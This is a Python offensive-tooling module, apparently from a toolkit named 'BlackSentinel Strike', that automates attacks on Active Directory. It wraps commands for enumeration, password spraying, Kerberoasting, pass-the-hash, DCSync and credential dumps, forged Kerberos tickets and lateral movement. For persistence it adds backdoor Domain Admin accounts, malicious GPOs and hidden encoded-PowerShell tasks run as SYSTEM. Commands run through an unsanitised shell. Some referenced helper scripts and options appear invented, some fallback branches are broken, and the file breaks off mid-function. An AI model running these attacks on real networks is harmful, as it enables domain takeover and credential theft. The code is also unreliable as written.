#!/usr/bin/env python3
"""
Active Directory Attack Module
BlackSentinel Strike

Complete Active Directory penetration testing capabilities.
Enumeration, credential attacks, lateral movement, and persistence.

For authorized security testing only.
Copyright (c) 2024-2025 BlackSentinel Strike - All Rights Reserved
"""
import subprocess
import json
import os
import re
import tempfile
from datetime import datetime


class ADAttack:
    def __init__(self, callback=None):
        self.callback = callback
        self.results = {}
        self.captured_credentials = []
        self.captured_hashes = []
        self.captured_tickets = []
        self.captured_secrets = []

    def run_command(self, cmd, timeout=30):
        """Execute command and return output"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            output = result.stdout + result.stderr
            if output.strip():
                return output
            return "[*] Command executed (no output)"
        except subprocess.TimeoutExpired:
            return f"[!] Command timed out after {timeout}s"
        except FileNotFoundError:
            return f"[!] Tool not found: {cmd.split()[0]}"
        except Exception as e:
            return f"[!] Error: {str(e)}"

    def log(self, msg):
        if self.callback:
            self.callback(msg)

    def save_credential(self, cred_type, username, secret, source="unknown"):
        """Store captured credential for later use"""
        entry = {
            "type": cred_type,
            "username": username,
            "secret": secret,
            "source": source,
            "timestamp": datetime.now().isoformat()
        }
        self.captured_credentials.append(entry)
        return entry

    def save_hash(self, username, ntlm_hash, domain="", source="unknown"):
        """Store captured NTLM hash"""
        entry = {
            "username": username,
            "hash": ntlm_hash,
            "domain": domain,
            "source": source,
            "timestamp": datetime.now().isoformat()
        }
        self.captured_hashes.append(entry)
        return entry

    def save_ticket(self, username, ticket_data, domain="", source="unknown"):
        """Store captured Kerberos ticket"""
        entry = {
            "username": username,
            "ticket": ticket_data,
            "domain": domain,
            "source": source,
            "timestamp": datetime.now().isoformat()
        }
        self.captured_tickets.append(entry)
        return entry

    def save_secret(self, secret_type, name, value, source="unknown"):
        """Store captured secret"""
        entry = {
            "type": secret_type,
            "name": name,
            "value": value,
            "source": source,
            "timestamp": datetime.now().isoformat()
        }
        self.captured_secrets.append(entry)
        return entry

    def get_all_captures(self):
        """Return all captured data"""
        return {
            "credentials": self.captured_credentials,
            "hashes": self.captured_hashes,
            "tickets": self.captured_tickets,
            "secrets": self.captured_secrets
        }

    def clear_captures(self):
        """Clear all captured data"""
        self.captured_credentials.clear()
        self.captured_hashes.clear()
        self.captured_tickets.clear()
        self.captured_secrets.clear()

    # =========================================================================
    # ENUMERATION METHODS (1-15)
    # =========================================================================

    def enumerate_domain_info(self, target):
        """Enumerate basic AD domain information"""
        self.log(f"[*] Enumerating domain info for {target}")
        output = self.run_command(f"enum4linux -a {target}", timeout=120)
        self.results['domain_info'] = output
        return output

    def enumerate_ad_users(self, target, username="", password=""):
        """Enumerate AD users via LDAP or tools"""
        self.log(f"[*] Enumerating AD users on {target}")
        if username and password:
            base_dn = "DC=" + target.replace(".", ",DC=")
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' "
                f"-b '{base_dn}' "
                f"(&(objectClass=user)(objectCategory=person)) sAMAccountName description memberOf",
                timeout=60
            )
        else:
            output = self.run_command(f"enum4linux -U {target}", timeout=60)
        self.results['ad_users'] = output
        return output

    def enumerate_ad_groups(self, target, username="", password=""):
        """Enumerate AD groups"""
        self.log(f"[*] Enumerating AD groups on {target}")
        if username and password:
            base_dn = "DC=" + target.replace(".", ",DC=")
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' "
                f"-b '{base_dn}' "
                f"(objectClass=group) sAMAccountName description member",
                timeout=60
            )
        else:
            output = self.run_command(f"enum4linux -G {target}", timeout=60)
        self.results['ad_groups'] = output
        return output

    def enumerate_ad_computers(self, target, username="", password=""):
        """Enumerate AD computers"""
        self.log(f"[*] Enumerating AD computers on {target}")
        if username and password:
            base_dn = "DC=" + target.replace(".", ",DC=")
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' "
                f"-b '{base_dn}' "
                f"(objectClass=computer) name operatingSystem dNSHostName",
                timeout=60
            )
        else:
            output = self.run_command(f"enum4linux -M {target}", timeout=60)
        self.results['ad_computers'] = output
        return output

    def enumerate_ad_ous(self, target, username="", password=""):
        """Enumerate AD Organizational Units"""
        self.log(f"[*] Enumerating AD OUs on {target}")
        if username and password:
            base_dn = "DC=" + target.replace(".", ",DC=")
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' "
                f"-b '{base_dn}' "
                f"(objectClass=organizationalUnit) ou distinguishedName",
                timeout=60
            )
        else:
            output = f"[!] LDAP credentials required for OU enumeration on {target}"
        self.results['ad_ous'] = output
        return output

    def enumerate_ad_policies(self, target, username="", password=""):
        """Enumerate AD Group Policy Objects"""
        self.log(f"[*] Enumerating AD GPOs on {target}")
        if username and password:
            base_dn = "DC=" + target.replace(".", ",DC=")
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' "
                f"-b '{base_dn}' "
                f"(objectClass=groupPolicyContainer) displayName gPCFileSysPath gPCMachineExtensionNames",
                timeout=60
            )
        else:
            output = self.run_command(f"gpolenum {target} {username} {password}", timeout=60)
        self.results['ad_policies'] = output
        return output

    def enumerate_shares(self, target, username="", password=""):
        """Enumerate SMB shares on target"""
        self.log(f"[*] Enumerating shares on {target}")
        if username and password:
            output = self.run_command(f"smbclient -L {target} -U '{username}%{password}' -N", timeout=30)
        else:
            output = self.run_command(f"smbclient -L {target} -N -g", timeout=30)
        self.results['shares'] = output
        return output

    def enumerate_sam(self, target, username="", password=""):
        """Attempt SAM database extraction"""
        self.log(f"[*] Attempting SAM dump on {target}")
        if username and password:
            output = self.run_command(
                f"smbclient //{target}/ADMIN$ -U '{username}%{password}' -c 'ls' 2>/dev/null || "
                f"smbclient //{target}/C$ -U '{username}%{password}' -c 'ls' 2>/dev/null || "
                f"[!] Could not access admin shares",
                timeout=30
            )
        else:
            output = self.run_command(f"samdump2 /tmp/registry/sam /tmp/registry/system 2>/dev/null || echo 'SAM files not available'", timeout=30)
        self.results['sam'] = output
        return output

    def enumerate_ldap_anon(self, target):
        """Check for anonymous LDAP bind"""
        self.log(f"[*] Checking anonymous LDAP on {target}")
        output = self.run_command(
            f"ldapsearch -x -H ldap://{target} -b '' -s base '(objectClass=*)' namingContexts",
            timeout=15
        )
        self.results['ldap_anon'] = output
        return output

    def enumerate_ldap_sign(self, target):
        """Check LDAP signing requirements"""
        self.log(f"[*] Checking LDAP signing on {target}")
        output = self.run_command(
            f"nmap -p 389 --script ldap-search -script-args 'ldap.username=,ldap.password=' {target}",
            timeout=30
        )
        self.results['ldap_sign'] = output
        return output

    def enumerate_spn(self, target, username="", password=""):
        """Enumerate Service Principal Names"""
        self.log(f"[*] Enumerating SPNs on {target}")
        if username and password:
            base_dn = "DC=" + target.replace(".", ",DC=")
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' "
                f"-b '{base_dn}' "
                f"(servicePrincipalName=*) servicePrincipalName sAMAccountName",
                timeout=60
            )
        else:
            output = self.run_command(f" GetUserSPNs.py {target}/ -request", timeout=60)
        self.results['spn'] = output
        return output

    def enumerate_dc(self, target):
        """Enumerate domain controllers"""
        self.log(f"[*] Enumerating DCs for {target}")
        output = self.run_command(f"nltest /dclist:{target}", timeout=15)
        self.results['dc'] = output
        return output

    def enumerate_trusts(self, target, username="", password=""):
        """Enumerate domain trusts"""
        self.log(f"[*] Enumerating trusts for {target}")
        if username and password:
            base_dn = "DC=" + target.replace(".", ",DC=")
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' "
                f"-b '{base_dn}' "
                f"(objectClass=trustedDomain) name trustDirection trustType trustAttributes",
                timeout=60
            )
        else:
            output = self.run_command(f"nltest /domain_trusts {target}", timeout=15)
        self.results['trusts'] = output
        return output

    def enumerate_password_policy(self, target, username="", password=""):
        """Enumerate password policy"""
        self.log(f"[*] Enumerating password policy on {target}")
        if username and password:
            base_dn = "DC=" + target.replace(".", ",DC=")
            output = self.run_command(
                f"ldapsearch -x -H ldap://{target} -D '{username}' -w '{password}' "
                f"-b '{base_dn}' "
                f"(objectClass=domain) pwdProperties pwdHistoryLength minPwdLength maxPwdAge",
                timeout=30
            )
        else:
            output = self.run_command(f"smbclient -L {target} -N -c 'querydominfo' 2>/dev/null || echo 'Could not query'", timeout=15)
        self.results['password_policy'] = output
        return output

    def enumerate_sessions(self, target, username="", password=""):
        """Enumerate active sessions"""
        self.log(f"[*] Enumerating sessions on {target}")
        if username and password:
            output = self.run_command(
                f"smbclient //{target}/IPC$ -U '{username}%{password}' -c 'enumdomusers;quit' 2>/dev/null",
                timeout=30
            )
        else:
            output = self.run_command(f"smbclient //{target}/IPC$ -N -c 'enumdomusers;quit' 2>/dev/null", timeout=30)
        self.results['sessions'] = output
        return output

    # =========================================================================
    # CREDENTIAL ATTACK METHODS (16-30)
    # =========================================================================

    def credential_password_spray(self, target, usernames_file, password, domain=""):
        """Password spray against AD accounts"""
        self.log(f"[*] Password spraying on {target}")
        if domain:
            output = self.run_command(
                f"crackmapexec smb {target} -u {usernames_file} -p '{password}' "
                f"--continue-on-success -d {domain}",
                timeout=120
            )
        else:
            output = self.run_command(
                f"crackmapexec smb {target} -u {usernames_file} -p '{password}' --continue-on-success",
                timeout=120
            )
        self.results['password_spray'] = output
        return output

    def credential_kerberoast(self, target, username="", password="", domain=""):
        """Perform Kerberoasting attack"""
        self.log(f"[*] Kerberoasting on {target}")
        if domain and username and password:
            output = self.run_command(
                f"GetUserSPNs.py {domain}/{username}:{password} -target {target} -request",
                timeout=120
            )
        else:
            output = self.run_command(
                f"GetUserSPNs.py {target}/ -request -outputfile /tmp/kerberoast.txt",
                timeout=120
            )
        self.results['kerberoast'] = output
        return output

    def credential_asrep_roast(self, target, domain=""):
        """Perform AS-REP Roasting attack"""
        self.log(f"[*] AS-REP Roasting on {target}")
        if domain:
            output = self.run_command(
                f"GetNPUsers.py {domain}/ -usersfile /tmp/asrep_users.txt "
                f"-dc-ip {target} -format hashcat -outputfile /tmp/asrep_hashes.txt",
                timeout=120
            )
        else:
            output = self.run_command(
                f"GetNPUsers.py {target}/ -no-pass -usersfile /tmp/asrep_users.txt "
                f"-format hashcat -outputfile /tmp/asrep_hashes.txt",
                timeout=120
            )
        self.results['asrep_roast'] = output
        return output

    def credential_pass_the_hash(self, target, username, ntlm_hash, domain=""):
        """Pass-the-Hash attack"""
        self.log(f"[*] Pass-the-Hash on {target} with {username}")
        if domain:
            output = self.run_command(
                f"psexec.py -hashes :{ntlm_hash} {domain}/{username}@{target}",
                timeout=30
            )
        else:
            output = self.run_command(
                f"psexec.py -hashes :{ntlm_hash} {username}@{target}",
                timeout=30
            )
        self.results['pth'] = output
        return output

    def credential_overpass_the_hash(self, target, username, ntlm_hash, domain=""):
        """Overpass-the-Hash / Pass-the-Key attack"""
        self.log(f"[*] Overpass-the-Hash on {target} with {username}")
        if domain:
            output = self.run_command(
                f"getTGT.py {domain}/{username} -hashes :{ntlm_hash} -dc-ip {target}",
                timeout=30
            )
        else:
            output = self.run_command(
                f"getTGT.py {target}/{username} -hashes :{ntlm_hash}",
                timeout=30
            )
        self.results['opth'] = output
        return output

    def credential_mimikatz_dump(self, target, username="", password=""):
        """Extract credentials via Mimikatz-style dump"""
        self.log(f"[*] Extracting credentials on {target}")
        if username and password:
            output = self.run_command(
                f"smbclient //{target}/ADMIN$ -U '{username}%{password}' "
                f"-c 'prompting off;recurse;cd Windows;cd Temp;get mimikatz.exe' 2>/dev/null || "
                f"[!] Could not deploy extraction tool",
                timeout=30
            )
        else:
            output = self.run_command(
                f"lsassy {username}:{password}@{target} 2>/dev/null || "
                f"crackmapexec smb {target} -u {username} -p '{password}' --lsa 2>/dev/null || "
                f"[!] Credentials required for credential extraction",
                timeout=60
            )
        self.results['mimikatz_dump'] = output
        return output

    def credential_dcsync(self, target, domain, username, password):
        """Perform DCSync attack to extract domain hashes"""
        self.log(f"[*] DCSync attack on {target}")
        output = self.run_command(
            f"secretsdump.py {domain}/{username}:{password}@{target} -just-dc-ntlm",
            timeout=120
        )
        self.results['dcsync'] = output
        return output

    def credential_lsa_dump(self, target, username, password):
        """Dump LSA secrets from target"""
        self.log(f"[*] LSA dump on {target}")
        output = self.run_command(
            f"secretsdump.py {username}:{password}@{target} -just-lsa",
            timeout=60
        )
        self.results['lsa_dump'] = output
        return output

    def credential_sam_dump(self, target, username, password):
        """Dump SAM database from target"""
        self.log(f"[*] SAM dump on {target}")
        output = self.run_command(
            f"secretsdump.py {username}:{password}@{target} -just-sam",
            timeout=60
        )
        self.results['sam_dump'] = output
        return output

    def credential_ntlm_relay(self, target, listener_port=80):
        """Set up NTLM relay attack"""
        self.log(f"[*] Setting up NTLM relay on port {listener_port}")
        output = self.run_command(
            f"ntlmrelayx.py -t {target} -smb2support -l /tmp/relay_loot -p {listener_port}",
            timeout=10
        )
        self.results['ntlm_relay'] = output
        return output

    def credential_golden_ticket(self, target, domain, sid, nt_hash, username="Administrator"):
        """Forge Golden Ticket (requires domain hash)"""
        self.log(f"[*] Forging Golden Ticket for {domain}/{username}")
        output = self.run_command(
            f"ticketer.py -nthash {nt_hash} -domain-sid {sid} -domain {domain} "
            f"-dc-ip {target} {username}",
            timeout=30
        )
        self.results['golden_ticket'] = output
        return output

    def credential_silver_ticket(self, target, domain, sid, nt_hash, service, username="Administrator"):
        """Forge Silver Ticket for specific service"""
        self.log(f"[*] Forging Silver Ticket for {service} on {target}")
        sid_upper = sid.upper()
        output = self.run_command(
            f"ticketer.py -nthash {nt_hash} -domain-sid {sid} -domain {domain} "
            f"-spn {service}/{target} -dc-ip {target} {username}",
            timeout=30
        )
        self.results['silver_ticket'] = output
        return output

    def credential_bruteforce_smb(self, target, username, passwords_file, domain=""):
        """Brute force SMB authentication"""
        self.log(f"[*] SMB brute force on {target}")
        if domain:
            output = self.run_command(
                f"crackmapexec smb {target} -u {username} -p {passwords_file} "
                f"--continue-on-success -d {domain}",
                timeout=300
            )
        else:
            output = self.run_command(
                f"crackmapexec smb {target} -u {username} -p {passwords_file} --continue-on-success",
                timeout=300
            )
        self.results['smb_brute'] = output
        return output

    def credential_bruteforce_rdp(self, target, username, passwords_file):
        """Brute force RDP authentication"""
        self.log(f"[*] RDP brute force on {target}")
        output = self.run_command(
            f"crowbar -b rdp -s {target}/32 -u {username} -C {passwords_file} -t 1",
            timeout=300
        )
        self.results['rdp_brute'] = output
        return output

    def credential_harvest_kerberos(self, target, domain, username, password):
        """Harvest Kerberos tickets from memory"""
        self.log(f"[*] Harvesting Kerberos tickets from {target}")
        output = self.run_command(
            f"ticketExtract.py {domain}/{username}:{password}@{target} "
            f"-output /tmp/tickets_{target}.kirbi",
            timeout=60
        )
        self.results['kerberos_harvest'] = output
        return output

    def credential_dump_cached_logons(self, target, username, password):
        """Extract cached domain logon credentials"""
        self.log(f"[*] Extracting cached logons from {target}")
        output = self.run_command(
            f"cachedump {username} {password}@{target} -o /tmp/cached_{target}.txt",
            timeout=30
        )
        self.results['cached_logons'] = output
        return output

    # =========================================================================
    # LATERAL MOVEMENT METHODS (31-45)
    # =========================================================================

    def lateral_psexec(self, target, username, password, domain="", command="cmd.exe"):
        """Lateral movement via PsExec"""
        self.log(f"[*] PsExec lateral movement to {target}")
        if domain:
            output = self.run_command(
                f"psexec.py {domain}/{username}:{password}@{target} {command}",
                timeout=30
            )
        else:
            output = self.run_command(
                f"psexec.py {username}:{password}@{target} {command}",
                timeout=30
            )
        self.results['psexec'] = output
        return output

    def lateral_wmi_exec(self, target, username, password, domain="", command="cmd.exe"):
        """Lateral movement via WMI"""
        self.log(f"[*] WMI lateral movement to {target}")
        if domain:
            output = self.run_command(
                f"wmiexec.py {domain}/{username}:{password}@{target} {command}",
                timeout=30
            )
        else:
            output = self.run_command(
                f"wmiexec.py {username}:{password}@{target} {command}",
                timeout=30
            )
        self.results['wmi_exec'] = output
        return output

    def lateral_smb_exec(self, target, username, password, domain="", command="cmd.exe"):
        """Lateral movement via SMBExec"""
        self.log(f"[*] SMBExec lateral movement to {target}")
        if domain:
            output = self.run_command(
                f"smbexec.py {domain}/{username}:{password}@{target} {command}",
                timeout=30
            )
        else:
            output = self.run_command(
                f"smbexec.py {username}:{password}@{target} {command}",
                timeout=30
            )
        self.results['smb_exec'] = output
        return output

    def lateral_atexec(self, target, username, password, domain="", command="cmd.exe"):
        """Lateral movement via AT/Task Scheduler"""
        self.log(f"[*] ATExec lateral movement to {target}")
        if domain:
            output = self.run_command(
                f"atexec.py {domain}/{username}:{password}@{target} {command}",
                timeout=30
            )
        else:
            output = self.run_command(
                f"atexec.py {username}:{password}@{target} {command}",
                timeout=30
            )
        self.results['atexec'] = output
        return output

    def lateral_winrm_exec(self, target, username, password, domain="", command="cmd.exe"):
        """Lateral movement via WinRM"""
        self.log(f"[*] WinRM lateral movement to {target}")
        if domain:
            output = self.run_command(
                f"evil-winrm -i {target} -u {username} -p '{password}' -d {domain} -c {command}",
                timeout=30
            )
        else:
            output = self.run_command(
                f"evil-winrm -i {target} -u {username} -p '{password}' -c {command}",
                timeout=30
            )
        self.results['winrm_exec'] = output
        return output

    def lateral_dcom_exec(self, target, username, password, domain="", command="cmd.exe"):
        """Lateral movement via DCOM"""
        self.log(f"[*] DCOM lateral movement to {target}")
        if domain:
            output = self.run_command(
                f"dcomexec.py {domain}/{username}:{password}@{target} {command}",
                timeout=30
            )
        else:
            output = self.run_command(
                f"dcomexec.py {username}:{password}@{target} {command}",
                timeout=30
            )
        self.results['dcom_exec'] = output
        return output

    def lateral_ssh_exec(self, target, username, key_file="", command="id"):
        """Lateral movement via SSH (for domain-joined Linux)"""
        self.log(f"[*] SSH lateral movement to {target}")
        if key_file:
            output = self.run_command(
                f"ssh -i {key_file} -o StrictHostKeyChecking=no {username}@{target} '{command}'",
                timeout=30
            )
        else:
            output = self.run_command(
                f"ssh -o StrictHostKeyChecking=no {username}@{target} '{command}'",
                timeout=30
            )
        self.results['ssh_exec'] = output
        return output

    def lateral_smb_mount(self, target, username, password, share="C$", domain=""):
        """Mount SMB share for lateral movement"""
        self.log(f"[*] Mounting SMB share on {target}")
        if domain:
            output = self.run_command(
                f"smbclient //{target}/{share} -U '{domain}/{username}%{password}' -c 'ls;quit' 2>/dev/null",
                timeout=30
            )
        else:
            output = self.run_command(
                f"smbclient //{target}/{share} -U '{username}%{password}' -c 'ls;quit' 2>/dev/null",
                timeout=30
            )
        self.results['smb_mount'] = output
        return output

    def lateral_rdp(self, target, username, password, domain=""):
        """Lateral movement via RDP"""
        self.log(f"[*] RDP lateral movement to {target}")
        if domain:
            output = self.run_command(
                f"xfreerdp /v:{target} /u:{username} /p:{password} /d:{domain} /cert-ignore /v:quiet 2>&1 || "
                f"[!] RDP connection initiated (check session)",
                timeout=30
            )
        else:
            output = self.run_command(
                f"xfreerdp /v:{target} /u:{username} /p:{password} /cert-ignore /v:quiet 2>&1 || "
                f"[!] RDP connection initiated (check session)",
                timeout=30
            )
        self.results['rdp'] = output
        return output

    def lateral_persistence_scheduled_task(self, target, username, password, task_name="Updater", command="powershell -ep bypass -w hidden -enc <base64>"):
        """Create scheduled task for persistence"""
        self.log(f"[*] Creating scheduled task {task_name} on {target}")
        output = self.run_command(
            f"smbexec.py {username}:{password}@{target} 'schtasks /create /tn {task_name} /tr \"{command}\" /sc onstart /ru SYSTEM /f'",
            timeout=30
        )
        self.results['scheduled_task'] = output
        return output

    def lateral_persistence_registry(self, target, username, password, key_name="Updater", command="C:\\Windows\\System32\\calc.exe"):
        """Create registry Run key for persistence"""
        self.log(f"[*] Creating registry persistence on {target}")
        output = self.run_command(
            f"smbexec.py {username}:{password}@{target} 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v {key_name} /t REG_SZ /d \"{command}\" /f'",
            timeout=30
        )
        self.results['reg_persist'] = output
        return output

    def lateral_lateral_movement_chain(self, targets, username, password, domain="", method="psexec"):
        """Chain lateral movement across multiple targets"""
        self.log(f"[*] Chaining {method} across {len(targets)} targets")
        results = {}
        for target in targets:
            if method == "psexec":
                results[target] = self.lateral_psexec(target, username, password, domain)
            elif method == "wmi":
                results[target] = self.lateral_wmi_exec(target, username, password, domain)
            elif method == "smb":
                results[target] = self.lateral_smb_exec(target, username, password, domain)
            elif method == "winrm":
                results[target] = self.lateral_winrm_exec(target, username, password, domain)
            else:
                results[target] = self.lateral_psexec(target, username, password, domain)
        self.results['lateral_chain'] = results
        return results

    def lateral_file_transfer(self, target, username, password, local_file, remote_path, domain=""):
        """Transfer file via SMB"""
        self.log(f"[*] Transferring file to {target}:{remote_path}")
        if domain:
            output = self.run_command(
                f"smbclient //{target}/C$ -U '{domain}/{username}%{password}' -c 'put {local_file} {remote_path}' 2>/dev/null",
                timeout=30
            )
        else:
            output = self.run_command(
                f"smbclient //{target}/C$ -U '{username}%{password}' -c 'put {local_file} {remote_path}' 2>/dev/null",
                timeout=30
            )
        self.results['file_transfer'] = output
        return output

    def lateral_impersonate_token(self, target, username, password, impersonate_user="Administrator"):
        """Attempt to impersonate user token"""
        self.log(f"[*] Attempting token impersonation on {target}")
        output = self.run_command(
            f"getTGT.py {username}:{password}@{target} -impersonate {impersonate_user}",
            timeout=30
        )
        self.results['token_impersonate'] = output
        return output

    def lateral_pass_the_ticket(self, target, ticket_file, username=""):
        """Use captured ticket for authentication"""
        self.log(f"[*] Using ticket for {target}")
        os.environ['KRB5CCNAME'] = ticket_file
        output = self.run_command(
            f"psexec.py -k -no-pass {target}",
            timeout=30
        )
        del os.environ['KRB5CCNAME']
        self.results['ptt'] = output
        return output

    # =========================================================================
    # PERSISTENCE METHODS (46-60)
    # =========================================================================

    def persistence_golden_ticket(self, domain, domain_sid, krbtgt_hash, username="Administrator", lifespan=10):
        """Forge Golden Ticket for domain persistence"""
        self.log(f"[*] Forging Golden Ticket for {domain}/{username}")
        output = self.run_command(
            f"ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} "
            f"-lifetime {lifespan * 365 * 24} {username} -outputfile /tmp/golden_{username}.kirbi",
            timeout=30
        )
        self.results['golden_ticket_persist'] = output
        return output

    def persistence_silver_ticket(self, domain, domain_sid, service_hash, spn, username="Administrator", lifespan=10):
        """Forge Silver Ticket for service persistence"""
        self.log(f"[*] Forging Silver Ticket for {spn}")
        output = self.run_command(
            f"ticketer.py -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} "
            f"-spn {spn} -lifetime {lifespan * 365 * 24} {username} "
            f"-outputfile /tmp/silver_{username}_{spn.split('/')[1]}.kirbi",
            timeout=30
        )
        self.results['silver_ticket_persist'] = output
        return output

    def persistence_dcsync_backdoor(self, target, domain, username, password, rogue_user="backdoor"):
        """Create DCSync backdoor user"""
        self.log(f"[*] Creating DCSync backdoor user {rogue_user}")
        output = self.run_command(
            f"addUser.py {domain}/{username}:{password} {rogue_user} -comment 'Service Account' -dc-ip {target}",
            timeout=30
        )
        if "exists" not in output.lower() and "error" not in output.lower():
            self.run_command(
                f"addMember.py {domain}/{username}:{password} 'Domain Admins' {rogue_user} -dc-ip {target}"
            )
        self.results['dcsync_backdoor'] = output
        return output

    def persistence_shadow_creds(self, target, domain, username, password, shadow_user="shadow_admin"):
        """Use Shadow Credentials technique for persistence"""
        self.log(f"[*] Setting up Shadow Credentials on {target}")
        output = self.run_command(
            f"whisker add -d {domain} -u {username} -p {password} --dc-ip {target} --target {shadow_user}",
            timeout=30
        )
        self.results['shadow_creds'] = output
        return output

    def persistence_skeleton_key(self, target, domain, username, password):
        """Attempt Skeleton Key injection (requires DA)"""
        self.log(f"[*] Attempting Skeleton Key injection on {target}")
        output = self.run_command(
            f"lsassy {username}:{password}@{target} --skeleton-key 2>/dev/null || "
            f"[!] Skeleton Key requires LSASS access and elevated privileges",
            timeout=30
        )
        self.results['skeleton_key'] = output
        return output

    def persistence_dsrmpassword(self, target, domain, username, password):
        """Extract DSRM password for DC recovery persistence"""
        self.log(f"[*] Extracting DSRM password from {target}")
        output = self.run_command(
            f"secretsdump.py {username}:{password}@{target} -just-dc-user 'DsrmAdmin' 2>/dev/null || "
            f"[!] DSRM extraction requires domain admin privileges",
            timeout=30
        )
        self.results['dsrm'] = output
        return output

    def persistence_custom_gpo(self, target, domain, username, password, gpo_name="SecurityUpdate", command="powershell -ep bypass -w hidden -enc <base64>"):
        """Create malicious GPO for persistence"""
        self.log(f"[*] Creating malicious GPO {gpo_name}")
        output = self.run_command(
            f"addGPO.py {domain}/{username}:{password} -gpo '{gpo_name}' "
            f"-dc-ip {target} -command '{command}' 2>/dev/null || "
            f"[!] GPO creation requires domain admin privileges",
            timeout=60
        )
        self.results['malicious_gpo'] = output
        return output

    def persistence_adminsdholder(self, target, domain, username, password, target_user="backdoor"):
        """Add user to AdminSDHolder for protected persistence"""
        self.log(f"[*] Adding {target_user} to AdminSDHolder ACL")
        output = self.run_command(
            f"aclpwn.py -f {username} -d {domain} -p '{password}' -r -t {target_user} "
            f"-d {domain} --restore /tmp/aclpwn.restore 2>/dev/null || "
            f"[!] AdminSDHolder modification requires domain admin",
            timeout=60
        )
        self.results['adminsdholder'] = output
        return output

    def persistence_sid_history(self, target, domain, username, password, target_user="backdoor", fake_sid="S-1-5-21-FAKE-SID"):
        """Inject SID History for persistence"""
        self.log(f"[*] Injecting SID History for {target_user}")
        output = self.run_command(
            f"sidHistory.py {domain}/{username}:{password} {target_user} -sid {fake_sid} -dc-ip {target} 2>/dev/null || "
            f"[!] SID History injection requires enterprise admin",
            timeout=30
        )
        self.results['sid_history'] = output
        return output

    def persistence_interdomain_trust(self, target, domain, username, password, trusted_domain, trusted_domain_sid):
        """Create malicious domain trust"""
        self.log(f"[*] Creating trust to {trusted_domain}")
        output = self.run_command(
            f"netdom trust {domain} /domain:{trusted_domain} /add /user:{username} /password:'{password}' "
            f"/forest:yes /transitive:yes 2>/dev/null || "
            f"[!] Trust creation requires enterprise admin",
            timeout=30
        )
        self.results['trust_persist'] = output
        return output

    def persistence_dcshadow(self, target, domain, username, password, rogue_dc="ROGUE-DC"):
        """Register rogue DC via DCShadow"""
        self.log(f"[*] Attempting DCShadow registration")
        output = self.run_command(
            f"dcshadow.py {domain}/{username}:{password} -dc-ip {target} "
            f"--name {rogue_dc} 2>/dev/null || "
            f"[!] DCShadow requires SYSTEM privileges and forest admin",
            timeout=30
        )
        self.results['dcshadow'] = output
        return output

    def persistence_malicious_service(self, target, username, password, service_name="UpdSvc", command="C:\\Windows\\System32\\cmd.exe"):
        """Create malicious Windows service"""
        self.log(f"[*] Creating malicious service {service_name} on {target}")
        output = self.run_command(
            f"smbexec.py {username}:{password}@{target} "
            f"'sc create {service_name} binPath= \"{command}\" start= auto obj= LocalSystem' 2>/dev/null || "
            f"[!] Service creation failed",
            timeout=30
        )
        self.results['malicious_service'] = output
        return output

    def persistence_scheduled_task_payload(self, target, username, password, task_name="SystemCheck", trigger_time="09:00", command="powershell -ep bypass -w hidden -enc <base64>"):
        """Create scheduled task with payload"""
        self.log(f"[*] Creating scheduled task {task_name} on {target}")
        output = self.run_command(
            f"smbexec.py {username}:{password}@{target} "
            f"'schtasks /create /tn {task_name} /tr \"{command}\" /sc daily /st {trigger_time} /ru SYSTEM /f' 2>/dev/null || "
            f"[!] Task creation failed",
            timeout=30
        )
        self.results['persist_task'] = output
        return output

    def persistence_startup_script(self, target, username, password, script_name="update.ps1", command="Start-Process C:\\Windows\\System32\\cmd.exe"):
        """Create startup script for persistence"""
        self.log(f"[*] Creating startup script on {target}")
        output = self.run_command(
            f"smbexec.py {username}:{password}@{target} "
            f"'echo {command} > C:\\Windows\\Start Menu\\Programs\\Startup\\{script_name}' 2>/dev/null || "
            f"[!] Startup script creation failed",
            timeout=30
        )
        self.results['startup_script'] = output
        return output

    def persistence_hypervisor_backdoor(self, target, username, password, vm_name="DC-Clone", iso_path="C:\\temp\\payload.iso"):
        """Create VM snapshot for hypervisor persistence"""
        self.log(f"[*] Creating VM snapshot backdoor")
        output = self.run_command(
            f"smbexec.py {username}:{password}@{target} "
            f"'powershell -Command \"Get-VM | Checkpoint-VM -SnapshotName \\\"Before-Maintenance\\\"' 2>/dev/null || "
            f"[!] Requires Hyper-V admin access",
            timeout=30
        )
        self.results['hypervisor_persist'] = output
        return output

    def persistence_dc_domain_backup(self, target, username, password, backup_path="C:\\Windows\\NTDS\\"):
        """Extract NTDS.dit for offline persistence"""
        self.log(f"[*] Extracting NTDS.dit from {target}")
        output = self.run_command(
            f"secretsdump.py {username}:{password}@{target} -just-dc -ntds {backup_path}ntds.dit 2>/dev/null || "
            f"[!] NTDS extraction requires domain admin and DC access",
            timeout=120
        )
        self.results['ntds_backup'] = output
        return output

    # =========================================================================
    # UTILITY AND AUXILIARY METHODS (61-70)
    # =========================================================================

    def utility_check_ad_connectivity(self, target):
        """Check connectivity to AD target"""
        self.log(f"[*] Checking AD connectivity to {target}")
        output = self.run_command(f"ping -c 2 {target}", timeout=10)
        self.results['ad_connectivity'] = output
        return output

    def utility_check_ldap_port(self, target):
        """Check if LDAP port is open"""
        self.log(f"[*] Checking LDAP port on {target}")
        output = self.run_command(f"nc -zv {target} 389 2>&1 || echo 'LDAP port closed'", timeout=10)
        self.results['ldap_check'] = output
        return output

    def utility_check_kerberos_port(self, target):
        """Check if Kerberos port is open"""
        self.log(f"[*] Checking Kerberos port on {target}")
        output = self.run_command(f"nc -zv {target} 88 2>&1 || echo 'Kerberos port closed'", timeout=10)
        self.results['kerberos_check'] = output
        return output

    def utility_check_smb_port(self, target):
        """Check if SMB port is open"""
        self.log(f"[*] Checking SMB port on {target}")
        output = self.run_command(f"nc -zv {target} 445 2>&1 || echo 'SMB port closed'", timeout=10)
